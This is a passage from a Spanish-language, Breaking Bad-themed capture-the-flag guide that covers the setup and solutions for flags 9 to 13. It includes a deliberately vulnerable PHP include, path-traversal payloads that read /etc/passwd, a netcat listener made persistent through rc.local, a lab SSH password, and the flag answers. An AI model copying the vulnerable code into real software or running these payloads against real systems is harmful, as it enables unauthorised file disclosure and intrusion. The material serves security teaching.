<li><p>-v: Modo verboso (opcional, muestra informaciÃ³n de la
conexiÃ³n).</p></li>
<li><p>-p 31337: Especifica el puerto para escuchar.</p></li>
<li><p>&lt; /opt/bandera9.txt: Redirige el contenido del archivo de la
bandera a Netcat. Cuando un cliente se conecte, Netcat le enviarÃ¡ el
contenido del archivo y luego se cerrarÃ¡.</p></li>
</ul>
<ol start="3" type="1">
<li><p><strong>El comando fue integrado en /etc/rc.local para
persistencia tras reinicio:</strong></p></li>
</ol>
<p>El comando nc -lvp 31337 &lt; /opt/bandera9.txt se ejecuta en primer
plano, lo que significa que:</p>
<p>ğŸ§ EstarÃ¡ escuchando mientras la terminal estÃ© abierta y el proceso
siga vivo.</p>
<p>ğŸ”„ Si reinicias la mÃ¡quina, el proceso desaparecerÃ¡ (no persistirÃ¡
tras el reinicio).</p>
<p>ğŸ“¡ Netcat no tiene comportamiento tipo â€œservicioâ€ por sÃ­ mismo.</p>
<p><strong>Â¿CÃ³mo hacer que siga activo tras el reinicio?</strong></p>
<p>Usar un script de inicio en /etc/rc.local (si estÃ¡ disponible)</p>
<blockquote>
<p>nc -lvp 31337 &lt; /opt/bandera9.txt &amp;</p>
<p>exit 0</p>
</blockquote>
<p><img src="cookbook/media/image148.png"
style="width:5.90694in;height:2.93333in" /></p>
<ol start="4" type="1">
<li><p><strong>Verificado que no hay reglas de iptables bloqueando el
trÃ¡fico entrante:</strong></p></li>
</ol>
<p>Este comando te mostrarÃ¡ todas las reglas actuales, incluyendo:</p>
<p>sudo iptables -L -n -v</p>
<ul>
<li><p>Las polÃ­ticas por defecto de las cadenas (INPUT, OUTPUT,
FORWARD)</p></li>
<li><p>Los puertos bloqueados o permitidos</p></li>
</ul>
<p>ğŸ’¡Busca si hay alguna regla que afecte el puerto 31337 en la cadena
INPUT.</p>
<ul>
<li><p>PolÃ­ticas de INPUT, FORWARD, OUTPUT: todas en ACCEPT</p></li>
</ul>
<p><img src="cookbook/media/image149.png"
style="width:5.90694in;height:1.53333in" /></p>
<p>Lo que muestra la imagen es muy claro: todas las cadenas (INPUT,
FORWARD, OUTPUT) tienen la polÃ­tica ACCEPT y no hay reglas configuradas
que interfieran. Eso significa:</p>
<p>ğŸ”“ No hay cortafuegos activo bloqueando el puerto 31337</p>
<p>âœ… Todo el trÃ¡fico entrante, saliente y reenviado estÃ¡ siendo
aceptado por defecto</p>
<p><span id="_Toc207189924" class="anchor"></span><strong>ğŸ§ª Pasos para
capturar la bandera</strong></p>
<p><strong>1ï¸âƒ£ Escaneo completo de puertos</strong></p>
<p>El jugador debe usar nmap sin limitaciÃ³n de puertos:</p>
<p>nmap -p 1-65535 192.168.1.44</p>
<p><img src="cookbook/media/image150.png"
style="width:5.90556in;height:2.69792in" /></p>
<p>âœ… Esto revelarÃ¡ el puerto 31337 como <strong>abierto</strong>.</p>
<p><strong>2ï¸âƒ£ ConexiÃ³n al puerto oculto</strong></p>
<p>Usando Netcat:</p>
<p>nc 192.168.1.44 31337</p>
<p>Al conectarse, Netcat enviarÃ¡ el contenido de la bandera
automÃ¡ticamente.</p>
<p><img src="cookbook/media/image151.png"
style="width:5.90556in;height:0.85972in" /></p>
<p><strong>3ï¸âƒ£ Resultado esperado en la terminal</strong></p>
<p>Bandera9: â€™Estoy_en_el_negocio_del_imperioâ€™</p>
<p>âœ… Â¡Flag obtenida directamente desde el servicio clandestino!</p>
<p><span id="_Toc207189925" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p>Refuerza la importancia del reconocimiento en profundidad (no
limitar escaneos a puertos conocidos).</p></li>
<li><p>Expone cÃ³mo Netcat puede utilizarse para transferir informaciÃ³n
de manera discreta.</p></li>
<li><p>Introduce el concepto de persistencia de servicios mediante
scripts de arranque como rc.local.</p></li>
</ul>
<p><span id="_Toc207189926" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Bandera 9 atrapada:
'Estoy_en_el_negocio_del_imperio'</mark><strong><br />
</strong></p>
<h1 id="bandera-10-vulnerabilidad-lfi-en-aplicaciÃ³n-php"><strong>ğŸ
Bandera 10 â€“ Vulnerabilidad LFI en AplicaciÃ³n PHP</strong></h1>
<p><strong>CategorÃ­a:</strong> Web Exploitation / Local File
Inclusion<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Flag:</strong> Usted_no_es_una_persona_discreta<br />
<strong>Archivo vulnerable:</strong> ver.php<br />
ğŸ“ Ruta esperada: http://&lt;IP_CTF&gt;/ver.php<br />
ğŸ“„ Bandera alojada en: /var/www/bandera10.txt</p>
<p><span id="_Toc207189928" class="anchor"></span><strong>ğŸ¯ Objetivo
del reto</strong></p>
<p>El jugador debe descubrir que el script PHP ver.php permite incluir
archivos arbitrarios en el servidor sin validaciÃ³n, lo que le permitirÃ¡
leer archivos sensibles como /etc/passwd o incluso acceder directamente
al archivo que contiene la bandera.</p>
<p><span id="_Toc207189929" class="anchor"></span><strong>âš™ï¸ Entorno
tÃ©cnico configurado</strong></p>
<p>La vulnerabilidad LFI (Local File Inclusion) ocurre cuando una
aplicaciÃ³n web permite que un usuario incluya un archivo en el servidor,
generalmente a travÃ©s de un parÃ¡metro en la URL, sin validar o sanear
adecuadamente la entrada. Un atacante puede manipular este parÃ¡metro
para cargar archivos fuera del directorio esperado de la aplicaciÃ³n,
como /etc/passwd o un archivo de logs que contenga su propio cÃ³digo
malicioso.</p>
<p><strong>Â¿CÃ³mo funciona la vulnerabilidad LFI?</strong></p>
<p>Imagina que una pÃ¡gina web utiliza una URL como
http://ejemplo.com/pagina.php?file=contacto.html para cargar diferentes
pÃ¡ginas. El script pagina.php toma el valor del parÃ¡metro file y lo
incluye directamente en el cÃ³digo de la pÃ¡gina, por ejemplo, usando la
funciÃ³n include() de PHP.</p>
<p>Si un atacante cambia la URL a:</p>
<p><a
href="http://ejemplo.com/pagina.php?file=../../../../etc/passwd">http://ejemplo.com/pagina.php?file=../../../../etc/passwd</a></p>
<p>el servidor intentarÃ¡ cargar el archivo /etc/passwd. Los ../ (puntos
y barra) le permiten "subir" en la estructura de directorios, escapando
de la carpeta web. Si no hay una validaciÃ³n adecuada, el contenido del
archivo de contraseÃ±as se mostrarÃ¡ en la pÃ¡gina.</p>
<p>La explotaciÃ³n de LFI se puede usar para:</p>
<ol type="1">
<li><p>Leer archivos sensibles: Acceder a archivos como /etc/passwd para
obtener nombres de usuario o /etc/apache2/apache2.conf para ver la
configuraciÃ³n del servidor web.</p></li>
<li><p>EjecuciÃ³n remota de cÃ³digo (RCE): La tÃ©cnica mÃ¡s avanzada para un
CTF. El atacante puede inyectar cÃ³digo PHP malicioso en un archivo del
sistema al que tiene acceso (por ejemplo, un archivo de log de Apache),
y luego usar LFI para "incluir" ese archivo, lo que ejecuta el cÃ³digo
PHP.</p></li>
</ol>
<p><strong>ConfiguraciÃ³n implementada en la mÃ¡quina</strong></p>
<ol type="1">
<li><p><strong>Servidor web Apache con PHP activo:</strong></p></li>
</ol>
<blockquote>
<p>sudo apt-get install apache2 php5 libapache2-mod-php5</p>
</blockquote>
<ol start="2" type="1">
<li><p><strong>Archivo vulnerable creado</strong> en
/var/www/html/ver.php:</p></li>
</ol>
<blockquote>
<p>&lt;?php</p>
<p>$file = $_GET['file'];</p>
<p>include($file);</p>
<p>?&gt;</p>
</blockquote>
<ol start="3" type="1">
<li><p><strong>Bandera colocada fuera del directorio
web</strong>:</p></li>
</ol>
<blockquote>
<p>echo "Bandera10:â€™Usted_no_es_una_persona_discretaâ€™" &gt;
/var/www/bandera10.txt</p>
<p>sudo chown root:root /var/www/bandera10.txt</p>
<p>sudo chmod 400 /var/www/bandera10.txt</p>
</blockquote>
<p><span id="_Toc207189930" class="anchor"></span><strong>ğŸ§ª Pasos para
capturar la bandera</strong></p>
<p><strong>1ï¸âƒ£ Localizar la pista</strong></p>
<p>En el cÃ³digo fuente de la pÃ¡gina nosotros.html encontramos una pista
que nos dice:</p>
<p><img src="cookbook/media/image152.png"
style="width:5.54167in;height:0.61458in" /></p>
<p>Esto nos hace pensar que se trata de una vulnerabilidad de LFI:</p>
<p>http://192.168.1.44/ver.php?file=nosotros.html</p>
<p>AquÃ­ es donde el jugador puede deducir que puede manipular el
parÃ¡metro file.</p>
<p>ver.php?file=</p>
<p><img src="cookbook/media/image153.png"
style="width:5.90556in;height:2.20417in" /></p>
<p><strong>2ï¸âƒ£ Probar con archivo sensible del sistema</strong></p>
<p>Usar:</p>
<p><a
href="http://192.168.1.44/ver.php?file=../../../../etc/passwd">http://192.168.1.44/ver.php?file=../../../../etc/passwd</a></p>
<p><img src="cookbook/media/image154.png"
style="width:5.90556in;height:1.08472in" /></p>
<p>âœ… Si aparece contenido, se confirma la vulnerabilidad LFI.</p>
<p><strong>3ï¸âƒ£ Apuntar al archivo de la bandera</strong></p>
<p>Ya que la bandera estÃ¡ en /var/www/, y ver.php estÃ¡ en
/var/www/html/, se puede acceder con:</p>
<p>http://192.168.1.44/ver.php?file=../bandera10.txt</p>
<p>Esto sube un nivel y accede al archivo directamente.</p>
<p>http://192.168.1.44/ver.php?file=/var/www/bandera10.txt</p>
<p><img src="cookbook/media/image155.png"
style="width:5.90556in;height:1.17153in" /></p>
<p><img src="cookbook/media/image156.png"
style="width:5.90556in;height:0.975in" /></p>
<p><strong>4ï¸âƒ£ Resultado esperado en navegador</strong></p>
<p>Bandera10:â€™Usted_no_es_una_persona_discretaâ€™</p>
<p><span id="_Toc207189931" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p>El reto muestra los peligros de usar include() sin sanitizar
entradas.</p></li>
<li><p>Introduce tÃ©cnicas de path traversal (../) para escapar de la
carpeta web.</p></li>
<li><p>Simula un entorno real de pentesting con PHP vulnerable.</p></li>
</ul>
<p><strong>ğŸ”§ ValidaciÃ³n</strong></p>
<p>El jugador puede verificar vulnerabilidad desde terminal con
curl:</p>
<p>curl "http://192.168.1.44/ver.php?file=../bandera10.txt"</p>
<p><span id="_Toc207189932" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Bandera 10 atrapada:
'Usted_no_es_una_persona_discreta'</mark><strong><br />
</strong></p>
<h1 id="bandera-11-forense-de-pdf-con-cÃ³digos-de-ubicaciÃ³n"><strong>ğŸ
Bandera 11 â€“ Forense de PDF con CÃ³digos de UbicaciÃ³n</strong></h1>
<p><strong>CategorÃ­a:</strong> Forense / CriptografÃ­a Posicional /
Document Analysis<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Flag reconstruida:</strong> blue_sky_save_family<br />
<strong>CÃ³digo original:</strong> 8:15:3_5:5:11_48:13:3_68:7:6<br />
ğŸ“„ Archivo clave: PDF del guion <em>Breaking Bad 312 â€“ Half
Measures</em><br />
ğŸ“ Carpeta alojada en: /var/www/html/Privado</p>
<p><span id="_Toc207189934" class="anchor"></span><strong>ğŸ¯ Objetivo
del reto</strong></p>
<p>El jugador debe analizar el contenido del PDF original del episodio
312 de Breaking Bad, localizar palabras especÃ­ficas en distintas pÃ¡ginas
y lÃ­neas, y reconstruir una frase significativa que representa la
bandera.</p>
<p>Se ha creado una bandera CTF a partir de una frase oculta en el PDF
del guion de "Breaking Bad: Half Measures" (Episode 312). La bandera
debe ser una secuencia de cÃ³digos PÃ¡gina:LÃ­nea:Palabra para cada palabra
de la frase, y la frase debe estar compuesta por palabras de distintas
pÃ¡ginas del documento.</p>
<p><strong>Proceso de IdeaciÃ³n de la Frase:</strong></p>
<ul>
<li><p>TemÃ¡tica: Se buscÃ³ una frase que tuviera relevancia para la serie
"Breaking Bad" y que pudiera construirse con palabras clave dispersas en
el guion.</p></li>
<li><p>Elementos Clave Considerados:</p></li>
</ul>
<ul>
<li><p>"Blue Sky": El nombre del producto distintivo de Walter
White.</p></li>
<li><p>"Family": La motivaciÃ³n principal de Walter.</p></li>
<li><p>Verbos de acciÃ³n/propÃ³sito: Como "saves", "protects", etc., para
conectar los elementos.</p></li>
</ul>
<ul>
<li><p>Frase Elegida: "Blue Sky saves family." Esta frase cumple con el
requisito de tener palabras en diferentes secciones y encapsula la
dualidad del negocio y la motivaciÃ³n de Walter.</p></li>
</ul>
<p><strong>BÃºsqueda y LocalizaciÃ³n de Palabras en el PDF:</strong></p>
<p>Se realizÃ³ un escaneo del contenido del PDF para encontrar las
ubicaciones exactas de cada palabra de la frase, siguiendo el formato
PÃ¡gina:LÃ­nea:Palabra.</p>
<p><strong>Palabra 1: "Blue"</strong></p>
<p>CÃ³digo: 8:15:3 (PÃ¡gina 8, LÃ­nea 15 de esa pÃ¡gina, Palabra 3)</p>
<p><img src="cookbook/media/image157.png"
style="width:4.56042in;height:2.66042in" /></p>
<p><strong>Palabra 2: "Sky"</strong></p>
<p>CÃ³digo: 5:5:11 (PÃ¡gina 5, LÃ­nea 5 de esa pÃ¡gina, Palabra 11)</p>
<p><img src="cookbook/media/image158.png"
style="width:5.90694in;height:2.18681in" /></p>
<p><strong>Palabra 3: "save"</strong></p>
<p>CÃ³digo: 48:13:3 (PÃ¡gina 48, LÃ­nea 13 de esa pÃ¡gina, Palabra 3)</p>
<p><img src="cookbook/media/image159.png"
style="width:5.32146in;height:2.97917in" /></p>
<p><strong>Palabra 4: "family."</strong></p>
<p>CÃ³digo: 68:7:6 (PÃ¡gina 68, LÃ­nea 7 de esa pÃ¡gina, Palabra 6)</p>
<p><img src="cookbook/media/image160.png"
style="width:5.90694in;height:2.52014in" /></p>
<p><strong>ConstrucciÃ³n de la Bandera 11:</strong></p>
<p>Combinando los cÃ³digos de las palabras en el orden de la frase "blue
sky save family", la bandera resultante es:</p>
<p>8:15:3 5:5:11 48:13:3 68:7:6</p>
<p>8:15:3_5:5:11_48:13:3_68:7:6</p>
<p>Bandera 11: â€˜8:15:3_5:5:11_48:13:3_68:7:6â€™</p>
<p>Creamos un archivo llamado bandera11.txt en el que colocamos el
cÃ³digo a modo de pista:</p>
<p><img src="cookbook/media/image161.png"
style="width:3.78056in;height:1.94653in" /></p>
<p>Y este archivo bandera11.txt junto con el PDF del Episodio 312 y
otros archivos para â€œdespistarâ€ los subimos al directorio /var/www/html
en una carpeta llamada Privado</p>
<p><img src="cookbook/media/image162.png"
style="width:5.90694in;height:1.24653in" /></p>
<p><img src="cookbook/media/image163.png"
style="width:5.90694in;height:1.8in" /></p>
<p><span id="_Toc207189935" class="anchor"></span><strong>ğŸ§ª Pasos para
capturar la bandera</strong></p>
<p><strong>1ï¸âƒ£ Localizar el archivo PDF</strong></p>
<p>Accede al servidor web:</p>
<p>http://192.168.1.44/Privado/</p>
<p>AllÃ­ estarÃ¡ el PDF junto a otros archivos seÃ±uelo, como:</p>
<ul>
<li><p>Los Pollos Hermanos MenÃº</p></li>
<li><p>certificado de higiene</p></li>
<li><p>manual del empleado</p></li>
</ul>
<p><img src="cookbook/media/image164.png"
style="width:5.90556in;height:3.80694in" /></p>
<p><strong>2ï¸âƒ£ Obtener el cÃ³digo de ubicaciÃ³n</strong></p>
<p>Usar el archivo bandera11.txt que incluye la secuencia:</p>
<p>8:15:3_5:5:11_48:13:3_68:7:6</p>
<p><img src="cookbook/media/image165.png"
style="width:5.90556in;height:1.45833in" /></p>
<p>Esto representa:</p>
<ul>
<li><p>PÃ¡gina 8, LÃ­nea 15, Palabra 3 â†’ "Blue"</p></li>
<li><p>PÃ¡gina 5, LÃ­nea 5, Palabra 11 â†’ "Sky"</p></li>
<li><p>PÃ¡gina 48, LÃ­nea 13, Palabra 3 â†’ "save"</p></li>
<li><p>PÃ¡gina 68, LÃ­nea 7, Palabra 6 â†’ "family."</p></li>
</ul>
<p><strong>3ï¸âƒ£ Abrir el PDF y navegar por ubicaciones</strong></p>
<p>Usa un visor con capacidad de copiar texto por lÃ­nea, como
<strong>PDFStudio</strong>, <strong>Evince</strong>, o
<strong>Okular</strong>.</p>
<p>Alternativamente, desde terminal puedes extraer texto:</p>
<p>pdftotext half_measures_312.pdf - | les</p>
<p><img src="cookbook/media/image166.png"
style="width:5.90556in;height:3.21806in" /></p>
<p>Luego contar pÃ¡ginas manualmente, lÃ­neas y palabras.</p>
<p><strong>4ï¸âƒ£ Reconstruir la bandera</strong></p>
<p>Unir las palabras en orden:</p>
<p>Blue Sky save family</p>
<p>Y transformarla en formato CTF:</p>
<p>blue_sky_save_family</p>
<p><span id="_Toc207189936" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p>Introduce al jugador en anÃ¡lisis posicional de texto plano en
PDFs.</p></li>
<li><p>Simula extracciÃ³n forense real a partir de documentos
pÃºblicos.</p></li>
<li><p>Refuerza habilidades de scripting, OCR, y decodificaciÃ³n
contextual.</p></li>
</ul>
<p><span id="_Toc207189937" class="anchor"></span><strong>ğŸ”§ Tip
adicional</strong></p>
<p>El jugador puede automatizar la extracciÃ³n con Python y bibliotecas
como PyPDF2, pdfminer, o pdfplumber.</p>
<p><span id="_Toc207189938" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Bandera 11 atrapada: 'blue_sky_save_family'</mark></p>
<p><strong><br />
</strong></p>
<h1
id="bandera-12-linux-fundamentals-warm-up-breaking-the-txt"><strong>ğŸ
Bandera 12 â€“ Linux Fundamentals / Warm-up: Breaking the
TXT</strong></h1>
<p><strong>CategorÃ­a:</strong> Linux Fundamentals / Warm-up<br />
<strong>Nivel:</strong> BÃ¡sico<br />
<strong>Flag:</strong> Soy_el_hombre_que_matÃ³_a_Gus_Fring<br />
<strong>Usuario involucrado:</strong> lydia<br />
ğŸ“ Carpeta clave: /home/lydia/<br />
ğŸ“„ Archivos clave:</p>
<ul>
<li><p>bndr12.txt â€“ archivo visible al jugador</p></li>
</ul>
<p><span id="_Toc207189940" class="anchor"></span><strong>ğŸ¯ Objetivo
del reto</strong></p>
<p>El jugador debe descubrir que un archivo con extensiÃ³n .txt puede ser
ejecutable en Linux si contiene un shebang y recibe permisos de
ejecuciÃ³n.</p>
<p>Al ejecutar el fichero, este desencadena un script oculto que genera
la bandera final en el mismo directorio.</p>
<p><strong>Entorno preparado</strong></p>
<p>Utilizamos un script para desplegar el reto.</p>
<p><strong>ğŸ”§ Script de instalaciÃ³n</strong></p>
<p>#!/bin/bash</p>
<p># Instalador reto CTF "Bandera12"</p>
<p>USER_HOME="/home/lydia"</p>
<p>CTF_FILE="bndr12.txt"</p>
<p>FLAG_FILE="bander12.txt"</p>
<p>SECRET_SCRIPT=".generar_bandera.sh"</p>
<p># 1. Crear archivo de pista estilo mexicano / Breaking Bad</p>
<p>sudo mkdir -p "$USER_HOME"</p>
<p>sudo bash -c "cat &gt; '$USER_HOME/$CTF_FILE' &lt;&lt;'EOF'</p>
<p>#!/bin/bash</p>
<p>bash \"\$(dirname \"\$0\")/$SECRET_SCRIPT\"</p>
<p>EOF"</p>
<p># 2. Crear script oculto que genera la bandera</p>
<p>sudo bash -c "cat &gt; '$USER_HOME/$SECRET_SCRIPT' &lt;&lt;'EOF'</p>
<p>#!/bin/bash</p>
<p>echo \"Bandera12: 'Soy_el_hombre_que_matÃ³_a_Gus_Fring'\" &gt;
\"\$(dirname \"\$0\")/$FLAG_FILE\"</p>
<p>chmod 644 \"\$(dirname \"\$0\")/$FLAG_FILE\"</p>
<p>echo 'Â¡Orale, compa! AquÃ­ estÃ¡ la bandera... pero recuerda, en
Albuquerque nada es gratis. Bandera12:
â€˜Soy_el_hombre_que_matÃ³_a_Gus_Fringâ€™'</p>
<p>EOF"</p>
<p># 3. Permisos</p>
<p>sudo chmod 755 "$USER_HOME/$SECRET_SCRIPT"</p>
<p>sudo chmod +x "$USER_HOME/$CTF_FILE"</p>
<p>sudo chown lydia:lydia "$USER_HOME/$CTF_FILE"
"$USER_HOME/$SECRET_SCRIPT"</p>
<p># 4. AÃ±adir pista al principio de bndr12.txt</p>
<p>sudo bash -c "echo \"// Eh, socio... dicen que si a este papelito le
das poder de ejecuciÃ³n, va a cantar la verdad mÃ¡s rÃ¡pido que Heisenberg
cocinando azul.\" | cat - '$USER_HOME/$CTF_FILE' &gt;
'$USER_HOME/${CTF_FILE}.tmp' &amp;&amp; mv '$USER_HOME/${CTF_FILE}.tmp'
'$USER_HOME/$CTF_FILE'"</p>
<p>echo "Reto instalado correctamente en $USER_HOME"</p>
<p><span id="_Toc207189941" class="anchor"></span><strong>ğŸ“œ DinÃ¡mica
breve</strong></p>
<ul>
<li><p>En /home/lydia habrÃ¡ un archivo
<strong>bndr12.txt</strong>.</p></li>
<li><p>Si el jugador lo <strong>hace ejecutable y lo lanza</strong>
(chmod +x bndr12.txt &amp;&amp; ./bndr12.txt), internamente llamarÃ¡ a un
script oculto que generarÃ¡ <strong>bander12.txt</strong> con la bandera
final.</p></li>
<li><p>Aunque el archivo tenga extensiÃ³n .txt, en Linux lo que importa
es que tenga el <em>shebang</em> (#!/bin/bash, por ejemplo) y permisos
de ejecuciÃ³n (chmod +x). El sistema lo ejecutarÃ¡ si lo invocas con
./nombre.</p></li>
</ul>
<p><span id="_Toc207189942" class="anchor"></span><strong>ğŸ§ª Pasos para
capturar la bandera</strong></p>
<p><strong>ConexiÃ³n SSH usando la cuenta de chow</strong></p>
<p>Ejecuta el cliente SSH:</p>
<p>ssh chow@192.168.1.44</p>
<p>Cuando te pida la contraseÃ±a, introduce</p>
<p>Ch0w$up1</p>
<p>Nos dirigimos al directorio de lydia:</p>
<p>/home/lydia</p>
<p><img src="cookbook/media/image122.png"
style="width:3.625in;height:0.76042in" /></p>
<p>y vemos bndr12.txt y el archivo pcap de la bandera 5.</p>
<p>Lo leemos:</p>
<p>cat bndr12.txt</p>
<blockquote>
<p>// Eh, socio... dicen que si a este papelito le das poder de
ejecuciÃ³n, va a cantar la verdad mÃ¡s rÃ¡pido que Heisenberg cocinando
azul.</p>
</blockquote>
<p><img src="cookbook/media/image167.png"
style="width:5.90556in;height:0.98264in" /></p>
<p>No nos muestra la bandera directamente, nos da una pista. Esta pista
nos debe hacer pensar en â€œDar permisos de ejecuciÃ³nâ€ â†’ al archivo
bndr12.txt y ejecutarlo:</p>
<blockquote>
<p>chmod +x bndr12.txt</p>
<p>./bndr12.txt</p>
</blockquote>
<p><img src="cookbook/media/image168.png"
style="width:5.90556in;height:1.13403in" /></p>
<p>Se genera bander12.txt con la bandera.</p>
<p>âœ… Ahora sÃ­ muestra la bandera:</p>
<p>Bandera12: â€˜Soy_el_hombre_que_matÃ³_a_Gus_Fringâ€™</p>
<p><span id="_Toc207189943" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p>En Linux la extensiÃ³n de un archivo es irrelevante: lo que define
si un fichero se puede ejecutar es:</p></li>
</ul>
<ol type="1">
<li><p>Que tenga un shebang (#!/bin/bash, #!/usr/bin/python,
etc.).</p></li>
<li><p>Que tenga permisos de ejecuciÃ³n (chmod +x archivo).</p></li>
</ol>
<ul>
<li><p>El jugador debe razonar que, aunque se trate de un archivo .txt,
puede contener un script.</p></li>
<li><p>Al darle permisos (chmod +x bndr12.txt) y ejecutarlo
(./bndr12.txt), el fichero actÃºa como launcher, invocando a un script
oculto en el mismo directorio (.generar_bandera.sh).</p></li>
<li><p>Dicho script oculto es el que realmente escribe la bandera en un
nuevo archivo (bander12.txt).</p></li>
<li><p>El reto pone a prueba el entendimiento de:</p></li>
<li><p>Permisos en Linux (lectura, escritura, ejecuciÃ³n).</p></li>
<li><p>Diferencia entre extensiÃ³n y funcionalidad de un
archivo.</p></li>
<li><p>Descubrimiento de scripts ocultos y ejecuciÃ³n indirecta.</p></li>
<li><p>LÃ³gica de â€œwrapper scriptsâ€ que actÃºan como
intermediarios.</p></li>
</ul>
<p><span id="_Toc207189944" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Bandera 12 atrapada:
'Soy_el_hombre_que_matÃ³_a_Gus_Fring'</mark></p>
<p><strong><br />
</strong></p>
<h1 id="bandera-13-anÃ¡lisis-forense-de-registro-auth.log"><strong>ğŸ
Bandera 13 â€“ AnÃ¡lisis Forense de Registro auth.log</strong></h1>
<p><strong>CategorÃ­a:</strong> Forense / Logs / OSINT<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Flag:</strong> Un_hombre_debe_tener_limites<br />
<strong>Usuario involucrado:</strong> mike<br />
<strong>ContraseÃ±a:</strong> <strong>XXXXXXXX</strong><br />
ğŸ“ Carpeta clave: /home/mike/logs<br />
ğŸ“„ Archivo clave: auth.log</p>
<p><span id="_Toc207189946" class="anchor"></span><strong>ğŸ¯ Objetivo
del reto</strong></p>
<p>El jugador debe revisar un archivo auth.log con apariencia legÃ­tima,
encontrar una <strong>entrada manipulada</strong>, y extraer la bandera
incrustada como si fuera una nota oculta en un evento de autenticaciÃ³n
exitoso.</p>
<p><span id="_Toc207189947" class="anchor"></span><strong>ğŸ› ï¸ Entorno
tÃ©cnico configurado</strong></p>
<p>Se ha escondido un archivo auth.log en una carpeta llamada logs
dentro del usuario mike. Esta no es una ubicaciÃ³n donde por defecto se
almacenen los archivos auth.log.</p>
<p>El archivo auth.log en sistemas Linux es un registro de eventos
relacionados con la autenticaciÃ³n y autorizaciÃ³n, como inicios de
sesiÃ³n, cambios de contraseÃ±a, y uso de sudo. En Debian y Ubuntu, se
encuentra en /var/log/auth.log, mientras que en entornos Red Hat y
Fedora se encuentra en /var/log/secure. Este archivo es crucial para la
seguridad y la auditorÃ­a, permitiendo rastrear quiÃ©n accede al sistema y
cÃ³mo accede.</p>
<p><strong>ğŸ“‚ Estructura del entorno</strong></p>
<p>El archivo auth.log como copia falsa, ubicada fuera de /var/log:</p>
<blockquote>
<p>/home/mike/logs/auth.log</p>
</blockquote>
<ul>
<li><p>Se ha llenado con eventos simulados:</p>
<ul>
<li><p>Inicio de sesiÃ³n SSH vÃ¡lidos e invÃ¡lidos</p></li>
<li><p>Uso de sudo y CRON</p></li>
<li><p>Conexiones desde mÃºltiples IPs</p></li>
<li><p>Algunas entradas realistas con texto y timestamps
vÃ¡lidos</p></li>
</ul></li>
<li><p>Una lÃ­nea personalizada que contiene la bandera:</p></li>
</ul>
<blockquote>
<p>Jul 30 12:13:10 lospollos sshd[2519]: Accepted password for mike from
10.13.37.99 port 55322 ssh2 - bandera13:
'Un_hombre_debe_tener_limites'</p>
</blockquote>
<p><span id="_Toc207189948" class="anchor"></span><strong>ğŸ§ª Pasos para
capturar la bandera</strong></p>
<p><strong>1ï¸âƒ£ Acceder como usuario chow</strong></p>
<p>ConexiÃ³n SSH usando la cuenta de chow</p>
<p>Ejecuta el cliente SSH:</p>
<p>ssh chow@192.168.1.44</p>
<p>Cuando te pida la contraseÃ±a, introduce</p>
<p>Ch0w$up1</p>
<p><strong>2ï¸âƒ£ Leer el archivo completo</strong></p>
<p>Desplazarse al usuario mike. Dentro del usuario tenemos dos
directorios: Lavanderia y Logs:</p>
<p><img src="cookbook/media/image169.png"
style="width:5.89583in;height:1.0625in" /></p>
<p>El directorio LavanderÃ­a era donde encontramos la bandera 4. Vamos a
ver a hora el de logs:</p>
<p><img src="cookbook/media/image170.png"
style="width:4.5625in;height:1.0625in" /></p>
<p>Hay un archivo llamado auth.log</p>
<p><strong>ğŸ“‘ Â¿QuÃ© es auth.log?</strong></p>
<p>El archivo <strong>auth.log</strong> es un <strong>log de
autenticaciÃ³n</strong> en sistemas Linux.<br />
Sirve para registrar todo lo relacionado con <strong>inicios de sesiÃ³n,
uso de sudo, acceso por SSH, PAM (Pluggable Authentication Modules),
etc.</strong></p>
<p>En Ã©l puedes encontrar:</p>
<ul>
<li><p>Intentos de login exitosos y fallidos.</p></li>
<li><p>Accesos por <strong>SSH</strong> (usuario, IP origen,
puerto).</p></li>
<li><p>Uso de sudo y si fue autorizado o denegado.</p></li>
<li><p>Mensajes relacionados con PAM (ej: bloqueo de usuarios).</p></li>
<li><p>Eventos de seguridad que pueden indicar ataques de fuerza
bruta.</p></li>
</ul>
<p><strong>ğŸ“‚ Â¿DÃ³nde suele estar ubicado?</strong></p>
<p>En distribuciones basadas en <strong>Debian/Ubuntu</strong>:</p>
<p>/var/log/auth.log</p>
<p>En distribuciones basadas en <strong>Red Hat / CentOS /
Fedora</strong>:</p>
<p>/var/log/secure</p>
<p><strong>ğŸ” Ejemplos de uso</strong></p>
<ul>
<li><p>Ver Ãºltimos accesos fallidos por SSH:</p></li>
<li><p>grep "Failed password" /var/log/auth.log</p></li>
<li><p>Ver inicios de sesiÃ³n exitosos:</p></li>
<li><p>grep "Accepted password" /var/log/auth.log</p></li>
<li><p>Ver comandos sudo ejecutados:</p></li>
<li><p>grep "sudo" /var/log/auth.log</p></li>
</ul>
<p>Es por esto que este archivo resulta extraÃ±o que se encuentre en esta
ubicaciÃ³n: /home/Mike/logs/auth.log</p>
<p>Vamos a analizarloâ€¦</p>
<p>Desde terminal:</p>
<p>cat auth.log</p>
<p><img src="cookbook/media/image171.png"
style="width:5.90556in;height:4.19236in" /></p>
<p>Nos devuelve mucho contenido para encontrar la bandera</p>
<p>Hacemos un filtrado efectivo para dejar solo las lÃ­neas con "Accepted
password:</p>
<p>grep "Accepted password" auth.log</p>
<p><img src="cookbook/media/image172.png"
style="width:5.90556in;height:0.66944in" /></p>
<p>Esto devuelve varias lÃ­neas, pero una de ellas se verÃ¡ diferente:</p>
<p>Jul 30 12:13:10 lospollos sshd[2519]: Accepted password for mike from
10.13.37.99 port 55322 ssh2 - bandera13:
'Un_hombre_debe_tener_limites'</p>
<p>âœ… Esa es la clave.</p>
<p><strong>3ï¸âƒ£ Extraer la bandera</strong></p>
<p>CÃ³piala tal cual del final de la lÃ­nea:</p>
<p>Un_hombre_debe_tener_limites</p>
